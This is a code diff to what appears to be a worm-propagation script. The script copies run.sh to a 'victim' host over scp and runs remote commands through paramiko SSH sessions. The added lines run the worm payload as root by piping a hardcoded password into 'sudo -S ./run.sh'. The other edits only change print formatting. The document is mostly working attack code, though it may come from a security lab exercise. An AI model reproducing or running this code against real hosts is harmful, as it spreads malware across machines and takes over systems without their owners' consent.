@@ -39,7 +39,8 @@ def attack():
     os.system('scp -P {0} run.sh {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
 
     # Run the worm
-
+    command = 'cd /home/{0}/Worm_Attack && ( echo victim | sudo -S ./run.sh )'
+    ssh_command_using_ssh_key(command)
 
 
 def ssh_command_using_name_pw(command):
@@ -50,7 +51,7 @@ def ssh_command_using_name_pw(command):
     session = client.get_transport().open_session()
 
     if session.active:
-        print('[Command]', command)
+        print('[Command] ' + command)
         session.exec_command(command)
 
         print('\n--------Victim Std Out--------')
@@ -69,7 +70,7 @@ def ssh_command_using_ssh_key(command):
     session = client.get_transport().open_session()
 
     if session.active:
-        print('[Command]', command)
+        print('[Command] ' + command)
         session.exec_command(command)
 
         print('\n--------Victim Std Out--------')
